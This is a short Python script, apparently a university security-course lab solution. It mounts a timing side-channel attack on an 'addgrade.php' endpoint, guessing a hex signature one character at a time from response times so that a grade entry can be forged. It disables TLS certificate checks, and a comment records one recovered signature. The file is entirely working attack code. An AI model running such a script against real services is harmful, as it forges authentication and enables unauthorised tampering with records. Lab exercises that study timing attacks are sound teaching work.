import requests

requests.packages.urllib3.disable_warnings()

# An timing attack based on time consuming chrcmp function
def timing_attack(name, grade, size=20, retries=10):
  url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php'
  params = {'name': name, 'grade': grade, 'signature': ''}
  hex_string = '0123456789abcdef'
  print('Searching...')

  signature = [''] * size

  for i in range(size):
    max_t = 0

    for j in range(len(hex_string)):
      params['signature'] = ''.join(signature[:i]) + hex_string[j]

      R = [requests.get(url, params, verify=False) for i in range(retries)]
      t = min([r.elapsed.total_seconds() for r in R])

      if(t > max_t):
        max_t = t
        signature[i] = hex_string[j]

    print('{}/{}'.format(i+1, size), ''.join(signature))
  
  params['signature'] = ''.join(signature)
  r = requests.get(url, params, verify=False)
  print('Sign verified:', int(r.text) == 1)

  return params

if __name__ == '__main__':
  # Kalle, 5 => 6823ea50b133c58cba36
  params = timing_attack(input('Name: '), int(input('Grade: ')), retries=int(input('Retries: ')))
  print(params)
